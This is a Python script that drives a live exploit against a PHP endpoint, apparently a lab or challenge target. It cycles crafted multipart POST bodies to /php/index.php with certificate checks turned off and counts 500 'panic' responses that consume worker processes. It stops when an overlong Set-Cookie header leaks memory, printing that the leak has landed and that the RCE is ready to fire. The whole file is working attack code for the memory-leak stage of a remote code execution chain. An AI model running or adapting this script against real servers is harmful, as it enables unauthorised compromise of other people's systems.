#!/usr/bin/env python3
"""Live B1-only rotation: k1/k2/k3 x forge 483/486 draws against the seasoned
pool. Each 500-panic consumes a deep-walk armed child; the parent respawns a
fresh (shallow-rubble) child, so the pool drifts toward walk<=3 states.
Stops on the first overlong Set-Cookie (the leak)."""
import socket
import ssl
import sys
import time

HOST = "php-rce.cloudflare.app"
BODIES = ["k1_482.bin", "k1_483.bin", "k1_484.bin", "k1_485.bin", "k1_486.bin", "k1_487.bin",
          "k2_482.bin", "k2_483.bin", "k2_484.bin", "k2_485.bin", "k2_486.bin", "k2_487.bin",
          "k3_482.bin", "k3_483.bin", "k3_484.bin", "k3_485.bin", "k3_486.bin", "k3_487.bin"]
PACE = 18.0


def draw(name):
    body = open(name, "rb").read()
    s = socket.create_connection((HOST, 443), timeout=30)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(s, server_hostname=HOST)
    s.settimeout(120)
    s.sendall(b"POST /php/index.php HTTP/1.1\r\nHost: " + HOST.encode() +
              b"\r\nContent-Type: multipart/form-data; boundary=CCCCCCCCCC\r\n"
              b"Content-Length: " + str(len(body)).encode() +
              b"\r\nConnection: close\r\n\r\n")
    s.sendall(body)
    resp = b""
    while True:
        try:
            c = s.recv(65536)
        except Exception:
            break
        if not c:
            break
        resp += c
    s.close()
    return resp


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 60
    for i in range(n):
        name = BODIES[i % len(BODIES)]
        try:
            resp = draw(name)
        except Exception as e:
            print(f"{i:3d} {name}: EXC {e!r}", flush=True)
            time.sleep(PACE)
            continue
        st = resp.split(b"\r\n", 1)[0][:36]
        j = resp.find(b"\r\n", resp.find(b"Set-Cookie"))
        cl = j - resp.find(b"Set-Cookie") if resp.find(b"Set-Cookie") >= 0 else 0
        open(f"eng_{i:03d}.resp", "wb").write(resp)
        tag = "normal"
        if cl > 200:
            tag = "*** OVERLONG LEAK ***"
        elif b"500" in st:
            tag = "panic-500 (child consumed)"
        elif b"Warning" in resp or b"exceeds" in resp:
            tag = "postlimit-warn"
        elif cl == 0:
            tag = f"no-cookie resp={len(resp)}"
        print(f"{i:3d} {name}: {st!r} cookie={cl} {tag}", flush=True)
        if cl > 200:
            print("[+] LEAK LANDED - decode and fire RCE", flush=True)
            return 0
        time.sleep(PACE)
    print("[*] engine done", flush=True)
    return 1


if __name__ == "__main__":
    sys.exit(main())
